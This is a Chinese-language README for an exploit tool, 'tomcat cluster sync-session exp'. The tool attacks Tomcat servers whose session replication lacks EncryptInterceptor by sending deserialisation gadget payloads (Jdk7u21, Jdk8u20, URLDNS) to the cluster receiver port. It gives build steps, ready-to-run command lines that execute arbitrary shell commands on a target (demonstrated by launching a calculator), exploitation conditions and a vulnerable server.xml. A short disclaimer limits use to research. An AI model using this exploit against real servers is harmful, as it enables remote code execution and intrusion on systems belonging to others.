*工具仅用于安全研究以及内部自查，禁止使用工具发起非法攻击，造成的后果使用者负责*

### tomcat cluster sync-session 利用exp

这是一个tomcat使用了自带session同步功能时，不安全的配置（没有使用EncryptInterceptor）导致存在的反序列化漏洞，通过精心构造的数据包，
可以对使用了tomcat自带session同步功能的服务器进行攻击。


### 使用

先编译出jar包：
```
mvn clean compile assembly:assembly
```
生成jar包存在于target目录下

使用，例：

```
java -jar tomcat-cluster-session-sync-exp-1.0-SNAPSHOT-jar-with-dependencies.jar 127.0.0.1 5000 Jdk7u21 "/bin/bash", "-c", "/System/Applications/Calculator.app/Contents/MacOS/Calculator"
java -jar tomcat-cluster-session-sync-exp-1.0-SNAPSHOT-jar-with-dependencies.jar 127.0.0.1 5000 Jdk8u20 "/bin/bash", "-c", "/System/Applications/Calculator.app/Contents/MacOS/Calculator"
java -jar tomcat-cluster-session-sync-exp-1.0-SNAPSHOT-jar-with-dependencies.jar 127.0.0.1 5000 URLDNS "http://tomcat.xxxxx.ceye.io"
```

### 条件
1. tomcat启用了session同步，没有配置EncryptInterceptor
2. jdk版本低于jdk8u20、jdk7u21（不知道有没有错）
3. 同步端点可访问（一般是内网）

### tomcat-session同步配置
（conf/server.xml）：
```
<Server>
    ...
    
    <Service>
        ...
        
        <Engine>
            ...
            
            <Cluster className="org.apache.catalina.ha.tcp.SimpleTcpCluster"
                    channelSendOptions="6">
            
                    <Manager className="org.apache.catalina.ha.session.BackupManager"
                      expireSessionsOnShutdown="false"
                      notifyListenersOnReplication="true"
                      mapSendOptions="6"/>
            
            
                    <Channel className="org.apache.catalina.tribes.group.GroupChannel">
                      <Membership className="org.apache.catalina.tribes.membership.McastService"
                        address="228.0.0.4"
                        port="45564"
                        frequency="500"
                        dropTime="3000"/>
                      <Receiver className="org.apache.catalina.tribes.transport.nio.NioReceiver"
                        address="123.123.123.123"
                        port="5000"
                        selectorTimeout="100"
                        maxThreads="6"/>
            
                      <Sender className="org.apache.catalina.tribes.transport.ReplicationTransmitter">
                        <Transport className="org.apache.catalina.tribes.transport.nio.PooledParallelSender"/>
                      </Sender>
                    </Channel>
            
                    <Valve className="org.apache.catalina.ha.tcp.ReplicationValve"
                      filter=".*\.gif;.*\.js;.*\.jpg;.*\.png;.*\.htm;.*\.html;.*\.css;.*\.txt;"/>
            
                    <Deployer className="org.apache.catalina.ha.deploy.FarmWarDeployer"
                      tempDir="/tmp/war-temp/"
                      deployDir="/tmp/war-deploy/"
                      watchDir="/tmp/war-listen/"
                      watchEnabled="false"/>
            
                    <ClusterListener className="org.apache.catalina.ha.session.ClusterSessionListener"/>
            </Cluster>
        </Engine>
  </Service>
</Server>
```
